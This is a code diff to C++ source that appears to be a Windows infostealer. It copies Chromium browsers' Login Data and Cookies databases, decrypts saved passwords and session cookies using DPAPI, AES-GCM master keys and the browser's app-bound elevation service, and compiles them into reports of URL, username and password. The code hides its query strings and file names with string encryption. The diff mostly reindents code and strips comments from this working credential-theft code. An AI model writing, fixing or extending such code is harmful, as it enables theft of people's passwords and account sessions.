@@ -77,11 +77,9 @@ namespace credential {
             if (FAILED(hr)) return "[v20 IID fail]";
 
             IElevator* pElevator = NULL;
-            // No CoInitialize here as it's done in TaskDispatcher
             hr = CoCreateInstance(clsid, NULL, CLSCTX_LOCAL_SERVER, iid, (void**)&pElevator);
             if (SUCCEEDED(hr) && pElevator) {
                 wchar_t* plaintext = NULL;
-                // v20 DecryptData usually expects the exact same byte array found in SQLite
                 hr = pElevator->DecryptData(ciphertext.data(), (uint32_t)ciphertext.size(), &plaintext);
                 if (SUCCEEDED(hr) && plaintext) {
                     std::string result = utils::ws2s(plaintext);
@@ -89,7 +87,7 @@ namespace credential {
                     pElevator->Release();
                     return result;
                 }
-                pElevator->Release();
+                if (pElevator) pElevator->Release();
                 return "[v20 DecryptData fail - HRESULT " + utils::Shared::ToHex(hr) + "]";
             }
             return "[v20 Elevation Service fail - HRESULT " + utils::Shared::ToHex(hr) + "]";
@@ -151,7 +149,6 @@ namespace credential {
                     return {};
                 }
 
-                // Remove "DPAPI" prefix (The first 5 bytes are 'DPAPI')
                 std::vector<BYTE> dpapiPayload(decodedKey.begin() + 5, decodedKey.end());
 
                 DATA_BLOB in, out;
@@ -175,7 +172,6 @@ namespace credential {
         std::string DecryptPassword(const std::vector<BYTE>& ciphertext, const std::vector<BYTE>& masterKey, const std::string& browserName) {
             if (ciphertext.empty()) return "";
 
-            // Modern Chromium: v10/v11 (AES-GCM)
             if (ciphertext.size() >= 15 && ciphertext[0] == 'v' && ciphertext[1] == '1') {
                 try {
                     if (masterKey.empty()) return "";
@@ -187,12 +183,10 @@ namespace credential {
                 } catch (...) { return ""; }
             }
 
-            // v20 (App-Bound Encryption) - Not decryptable with master key alone
             if (ciphertext.size() >= 2 && ciphertext[0] == 'v' && ciphertext[1] == '2') {
                 return DecryptAppBound(ciphertext, browserName);
             }
 
-            // Legacy Chromium: DPAPI
             DATA_BLOB in, out;
             in.pbData = (BYTE*)ciphertext.data();
             in.cbData = (DWORD)ciphertext.size();
@@ -276,35 +270,36 @@ namespace credential {
 
                     if (!fs::exists(loginData)) continue;
 
-                char tempPath[MAX_PATH];
-                GetTempPathA(MAX_PATH, tempPath);
-                std::string tempDb = std::string(tempPath) + "ld_" + std::to_string(GetTickCount64());
-                SafeCopyDatabase(loginData, tempDb);
+                    char tempPath[MAX_PATH];
+                    GetTempPathA(MAX_PATH, tempPath);
+                    std::string tempDb = std::string(tempPath) + "ld_" + std::to_string(GetTickCount64());
+                    SafeCopyDatabase(loginData, tempDb);
 
-                sqlite3* db;
-                if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
-                    std::string query_str = utils::ws2s(utils::DecryptW(kQueryLoginsEnc, wcslen(kQueryLoginsEnc)));
-                    sqlite3_stmt* stmt;
-                    if (sqlite3_prepare_v2(db, query_str.c_str(), -1, &stmt, NULL) == SQLITE_OK) {
-                        while (sqlite3_step(stmt) == SQLITE_ROW) {
-                            const char* url = (const char*)sqlite3_column_text(stmt, 0);
-                            const char* user = (const char*)sqlite3_column_text(stmt, 1);
-                            const void* blob = sqlite3_column_blob(stmt, 2);
-                            int blobLen = sqlite3_column_bytes(stmt, 2);
+                    sqlite3* db;
+                    if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
+                        std::string query_str = utils::ws2s(utils::DecryptW(kQueryLoginsEnc, wcslen(kQueryLoginsEnc)));
+                        sqlite3_stmt* stmt;
+                        if (sqlite3_prepare_v2(db, query_str.c_str(), -1, &stmt, NULL) == SQLITE_OK) {
+                            while (sqlite3_step(stmt) == SQLITE_ROW) {
+                                const char* url = (const char*)sqlite3_column_text(stmt, 0);
+                                const char* user = (const char*)sqlite3_column_text(stmt, 1);
+                                const void* blob = sqlite3_column_blob(stmt, 2);
+                                int blobLen = sqlite3_column_bytes(stmt, 2);
 
-                            if (url && user && blobLen > 0) {
-                                std::vector<BYTE> encrypted((BYTE*)blob, (BYTE*)blob + blobLen);
-                                std::string pass = DecryptPassword(encrypted, key, browser.name);
-                                if (!pass.empty()) {
-                                    report += browser.name + " | " + profile + " | " + url + " | " + user + " | " + pass + "\n";
+                                if (url && user && blobLen > 0) {
+                                    std::vector<BYTE> encrypted((BYTE*)blob, (BYTE*)blob + blobLen);
+                                    std::string pass = DecryptPassword(encrypted, key, browser.name);
+                                    if (!pass.empty()) {
+                                        report += browser.name + " | " + profile + " | " + url + " | " + user + " | " + pass + "\n";
+                                    }
                                 }
                             }
+                            sqlite3_finalize(stmt);
                         }
-                        sqlite3_finalize(stmt);
+                        sqlite3_close(db);
                     }
-                    sqlite3_close(db);
+                    SafeDeleteDatabase(tempDb);
                 }
-                SafeDeleteDatabase(tempDb);
             }
         }
 
@@ -358,7 +353,6 @@ namespace credential {
                 if (fs::exists(searchPath + "\\" + dName)) {
                     profiles.push_back(dName);
                 }
-                // Check for root profile cookies if Default doesn't exist or just anyway
                 std::string networkName = utils::ws2s(utils::DecryptW(kNetworkEnc, wcslen(kNetworkEnc)));
                 std::string cookiesName = utils::ws2s(utils::DecryptW(kCookiesEnc, wcslen(kCookiesEnc)));
                 if (fs::exists(searchPath + "\\" + networkName + "\\" + cookiesName) ||
@@ -378,47 +372,46 @@ namespace credential {
 
                 for (const auto& profile : profiles) {
                     std::string profileBase = profile.empty() ? searchPath : (searchPath + "\\" + profile);
+                    std::string cookiesPath = profileBase + "\\" + utils::ws2s(utils::DecryptW(kNetworkEnc, wcslen(kNetworkEnc))) + "\\" + utils::ws2s(utils::DecryptW(kCookiesEnc, wcslen(kCookiesEnc)));
+                    if (!fs::exists(cookiesPath)) {
+                        cookiesPath = profileBase + "\\" + utils::ws2s(utils::DecryptW(kCookiesEnc, wcslen(kCookiesEnc)));
+                    }
 
-                    // Modern path: \Network\Cookies, Legacy: \Cookies
-                std::string cookiesPath = profileBase + "\\" + utils::ws2s(utils::DecryptW(kNetworkEnc, wcslen(kNetworkEnc))) + "\\" + utils::ws2s(utils::DecryptW(kCookiesEnc, wcslen(kCookiesEnc)));
-                if (!fs::exists(cookiesPath)) {
-                    cookiesPath = profileBase + "\\" + utils::ws2s(utils::DecryptW(kCookiesEnc, wcslen(kCookiesEnc)));
-                }
+                    if (!fs::exists(cookiesPath)) continue;
 
-                if (!fs::exists(cookiesPath)) continue;
+                    char tempPath[MAX_PATH];
+                    GetTempPathA(MAX_PATH, tempPath);
+                    std::string tempDb = std::string(tempPath) + "ck_" + std::to_string(GetTickCount64());
+                    SafeCopyDatabase(cookiesPath, tempDb);
 
-                char tempPath[MAX_PATH];
-                GetTempPathA(MAX_PATH, tempPath);
-                std::string tempDb = std::string(tempPath) + "ck_" + std::to_string(GetTickCount64());
-                SafeCopyDatabase(cookiesPath, tempDb);
+                    sqlite3* db;
+                    if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
+                        std::string query_str = utils::ws2s(utils::DecryptW(kQueryCookiesEnc, wcslen(kQueryCookiesEnc)));
+                        sqlite3_stmt* stmt;
+                        if (sqlite3_prepare_v2(db, query_str.c_str(), -1, &stmt, NULL) == SQLITE_OK) {
+                            while (sqlite3_step(stmt) == SQLITE_ROW) {
+                                const char* host = (const char*)sqlite3_column_text(stmt, 0);
+                                const char* name = (const char*)sqlite3_column_text(stmt, 1);
+                                const char* cpath = (const char*)sqlite3_column_text(stmt, 2);
+                                const void* blob = sqlite3_column_blob(stmt, 3);
+                                int blobLen = sqlite3_column_bytes(stmt, 3);
+                                sqlite3_int64 expiry = sqlite3_column_int64(stmt, 4);
 
-                sqlite3* db;
-                if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
-                    std::string query_str = utils::ws2s(utils::DecryptW(kQueryCookiesEnc, wcslen(kQueryCookiesEnc)));
-                    sqlite3_stmt* stmt;
-                    if (sqlite3_prepare_v2(db, query_str.c_str(), -1, &stmt, NULL) == SQLITE_OK) {
-                        while (sqlite3_step(stmt) == SQLITE_ROW) {
-                            const char* host = (const char*)sqlite3_column_text(stmt, 0);
-                            const char* name = (const char*)sqlite3_column_text(stmt, 1);
-                            const char* cpath = (const char*)sqlite3_column_text(stmt, 2);
-                            const void* blob = sqlite3_column_blob(stmt, 3);
-                            int blobLen = sqlite3_column_bytes(stmt, 3);
-                            sqlite3_int64 expiry = sqlite3_column_int64(stmt, 4);
-
-                            if (host && name && cpath && blobLen > 0) {
-                                std::vector<BYTE> encrypted((BYTE*)blob, (BYTE*)blob + blobLen);
-                                std::string val = DecryptPassword(encrypted, key, browser.name);
-                                if (!val.empty()) {
-                                    ss << host << "\t" << ((host[0] == '.') ? "TRUE" : "FALSE") << "\t" << cpath << "\t" << "TRUE\t" << expiry << "\t" << name << "\t" << val << "\n";
-                                    count++;
+                                if (host && name && cpath && blobLen > 0) {
+                                    std::vector<BYTE> encrypted((BYTE*)blob, (BYTE*)blob + blobLen);
+                                    std::string val = DecryptPassword(encrypted, key, browser.name);
+                                    if (!val.empty()) {
+                                        ss << host << "\t" << ((host[0] == '.') ? "TRUE" : "FALSE") << "\t" << cpath << "\t" << "TRUE\t" << expiry << "\t" << name << "\t" << val << "\n";
+                                        count++;
+                                    }
                                 }
                             }
+                            sqlite3_finalize(stmt);
                         }
-                        sqlite3_finalize(stmt);
+                        sqlite3_close(db);
                     }
-                    sqlite3_close(db);
+                    SafeDeleteDatabase(tempDb);
                 }
-                SafeDeleteDatabase(tempDb);
             }
         }
 
